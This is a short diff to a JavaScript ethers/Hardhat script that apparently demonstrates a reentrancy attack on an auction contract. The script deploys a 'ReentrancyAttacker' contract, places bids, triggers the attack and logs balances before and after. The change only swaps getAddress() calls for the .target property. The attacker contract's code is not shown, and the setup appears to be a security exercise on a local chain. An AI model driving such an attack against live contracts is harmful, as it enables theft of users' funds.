@@ -9,7 +9,7 @@ module.exports = async function main(args) {
   await auction.waitForDeployment();
 
   const ReentrancyAttackerFactory = await ethers.getContractFactory("ReentrancyAttacker", hacker);
-  const attacker = await ReentrancyAttackerFactory.deploy(auction.getAddress());
+  const attacker = await ReentrancyAttackerFactory.deploy(auction.target);
   await attacker.waitForDeployment();
 
   const txBid = await auction.bid({value: ethers.parseEther('4')});
@@ -21,7 +21,7 @@ module.exports = async function main(args) {
   const txBid3 = await attacker.connect(hacker).proxyBid({value: ethers.parseEther('1')});
   await txBid3.wait();
 
-  console.log("Auction balance before attack", await ethers.provider.getBalance(auction.getAddress()));
+  console.log("Auction balance before attack", await ethers.provider.getBalance(auction.target));
 
   try {
     const doAttack = await attacker.connect(hacker).attack();
@@ -30,7 +30,7 @@ module.exports = async function main(args) {
     console.log(e.message);
     console.log('Something went wrong while trying to attack');
   } finally {
-    console.log("Auction balance after attack", await ethers.provider.getBalance(auction.getAddress()));
-    console.log("Attacker balance after attack", await ethers.provider.getBalance(attacker.getAddress()));
+    console.log("Auction balance after attack", await ethers.provider.getBalance(auction.target));
+    console.log("Attacker balance after attack", await ethers.provider.getBalance(attacker.target));
   }
 }
